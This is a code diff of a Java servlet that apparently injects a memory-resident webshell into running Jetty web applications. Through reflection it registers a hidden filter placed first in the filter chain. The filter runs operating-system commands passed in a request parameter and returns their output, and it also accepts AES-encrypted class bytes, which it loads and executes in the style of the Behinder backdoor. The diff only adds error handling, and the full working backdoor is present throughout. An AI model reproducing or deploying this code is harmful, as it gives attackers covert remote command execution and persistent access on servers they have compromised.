@@ -47,115 +47,119 @@ public class FilterBasedWithoutRequest extends HttpServlet {
 
             Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
             for(NamedObject namedObject : namedObjectSet){
-                field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
-                field.setAccessible(true);
-                modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
-                Object webAppContext = field.get(namedObject.getObject());
-
-                field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
-                field.setAccessible(true);
-                Object handler = field.get(webAppContext);
-
-                field = handler.getClass().getDeclaredField("_filters");
-                field.setAccessible(true);
-                Object[] objects = (Object[]) field.get(handler);
-
-                boolean flag = false;
-                for(Object o : objects){
-                    field = o.getClass().getSuperclass().getDeclaredField("_name");
+                try{
+                    field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
                     field.setAccessible(true);
-                    String name = (String)field.get(o);
-                    if(name.equals(filterName)){
-                        flag = true;
-                        break;
-                    }
-                }
+                    modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
+                    Object webAppContext = field.get(namedObject.getObject());
 
-                if(!flag){
-                    System.out.println("[+] Add Dynamic Filter");
+                    field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
+                    field.setAccessible(true);
+                    Object handler = field.get(webAppContext);
 
-                    ClassLoader classLoader = handler.getClass().getClassLoader();
-                    Class sourceClazz = null;
-                    Object holder = null;
-                    try{
-                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
-                        field = sourceClazz.getDeclaredField("JAVAX_API");
-                        modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
-                        Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
-                        holder = method.invoke(handler, field.get(null));
-                    }catch(ClassNotFoundException e){
-                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
-                        Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
-                        holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
+                    field = handler.getClass().getDeclaredField("_filters");
+                    field.setAccessible(true);
+                    Object[] objects = (Object[]) field.get(handler);
+
+                    boolean flag = false;
+                    for(Object o : objects){
+                        field = o.getClass().getSuperclass().getDeclaredField("_name");
+                        field.setAccessible(true);
+                        String name = (String)field.get(o);
+                        if(name.equals(filterName)){
+                            flag = true;
+                            break;
+                        }
                     }
 
-                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);
-                    Filter filter = new Filter() {
-                        @Override
-                        public void init(FilterConfig filterConfig) throws ServletException {
+                    if(!flag){
+                        System.out.println("[+] Add Dynamic Filter");
 
+                        ClassLoader classLoader = handler.getClass().getClassLoader();
+                        Class sourceClazz = null;
+                        Object holder = null;
+                        try{
+                            sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
+                            field = sourceClazz.getDeclaredField("JAVAX_API");
+                            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
+                            Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
+                            holder = method.invoke(handler, field.get(null));
+                        }catch(ClassNotFoundException e){
+                            sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
+                            Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
+                            holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                         }
 
-                        @Override
-                        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-                            System.out.println("[+] Dynamic Filter says hello");
+                        holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);
+                        Filter filter = new Filter() {
+                            @Override
+                            public void init(FilterConfig filterConfig) throws ServletException {
 
-                            String type = servletRequest.getParameter("type");
-                            if(type != null && type.equals("basic")){
-                                String cmd = servletRequest.getParameter(password);
-                                if(cmd != null && !cmd.isEmpty()){
-                                    String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
-                                    servletResponse.getWriter().println(result);
-                                }
-                            }else if(type != null && type.equals("behinder")){
-                                try{
-                                    if(servletRequest.getParameter(password)!=null){
-                                        String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
-                                        ((HttpServletRequest)servletRequest).getSession().setAttribute("u", key);
-                                        servletResponse.getWriter().print(key);
-                                        return;
-                                    }
-
-                                    Cipher cipher = Cipher.getInstance("AES");
-                                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
-                                    byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
-                                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
-                                    Object evilObject = evilClass.newInstance();
-                                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
-                                    targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
-                                }catch(Exception e){
-                                    e.printStackTrace();
-                                }
-                            }else{
-                                filterChain.doFilter(servletRequest, servletResponse);
                             }
-                        }
 
-                        @Override
-                        public void destroy() {
+                            @Override
+                            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+                                System.out.println("[+] Dynamic Filter says hello");
 
-                        }
+                                String type = servletRequest.getParameter("type");
+                                if(type != null && type.equals("basic")){
+                                    String cmd = servletRequest.getParameter(password);
+                                    if(cmd != null && !cmd.isEmpty()){
+                                        String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
+                                        servletResponse.getWriter().println(result);
+                                    }
+                                }else if(type != null && type.equals("behinder")){
+                                    try{
+                                        if(servletRequest.getParameter(password)!=null){
+                                            String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
+                                            ((HttpServletRequest)servletRequest).getSession().setAttribute("u", key);
+                                            servletResponse.getWriter().print(key);
+                                            return;
+                                        }
 
-                        class U extends ClassLoader{
-                            U(ClassLoader c){super(c);}
+                                        Cipher cipher = Cipher.getInstance("AES");
+                                        cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
+                                        byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
+                                        Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
+                                        Object evilObject = evilClass.newInstance();
+                                        Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
+                                        targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
+                                    }catch(Exception e){
+                                        e.printStackTrace();
+                                    }
+                                }else{
+                                    filterChain.doFilter(servletRequest, servletResponse);
+                                }
+                            }
 
-                            public Class g(byte []b){return super.defineClass(b,0,b.length);}
-                        }
-                    };
+                            @Override
+                            public void destroy() {
 
-                    holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
-                    handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);
+                            }
 
-                    Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
-                    Object filterMapping = clazz.newInstance();
-                    Method method = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
-                    method.setAccessible(true);
-                    method.invoke(filterMapping, holder);
-                    filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
-                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
+                            class U extends ClassLoader{
+                                U(ClassLoader c){super(c);}
 
-                    // prependFilterMapping 会自动把 filter 加到最前面
-                    handler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);
+                                public Class g(byte []b){return super.defineClass(b,0,b.length);}
+                            }
+                        };
+
+                        holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
+                        handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);
+
+                        Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
+                        Object filterMapping = clazz.newInstance();
+                        Method method = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
+                        method.setAccessible(true);
+                        method.invoke(filterMapping, holder);
+                        filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
+                        filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
+
+                        // prependFilterMapping 会自动把 filter 加到最前面
+                        handler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);
+                    }
+                }catch(Exception e){
+                    //pass
                 }
             }
         }catch(Exception e){
